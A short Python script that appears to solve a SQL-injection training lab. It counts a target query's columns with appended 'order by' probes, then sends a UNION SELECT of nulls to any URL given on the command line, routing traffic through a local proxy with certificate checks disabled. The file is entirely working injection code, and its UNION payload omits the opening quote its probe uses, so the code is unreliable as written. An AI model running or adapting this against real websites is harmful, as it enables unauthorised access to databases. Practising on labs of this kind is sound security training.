import sys, urllib3, requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies =  {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def num(url):
    for i in range(1, 10):
        r = requests.get(url + f"'order by {i}--", verify=False, proxies=proxies)
        if r.status_code == 500:
            return i - 1

def sqli(url):
    n = num(url)
    payload = 'union select ' + f'{"null, " * n}'.strip()[:-1] + '--'
    r = requests.get(url + payload, verify=False, proxies=proxies)
    return True if 'Congratulations, you solved the lab!' in r.text else False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except:
        print('[*] Useage: %s <url>' % sys.argv[0])
        print('[*] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    print('[+] SCCESSFUL' if sqli(url) else '[-] UNSCCESSFUL' )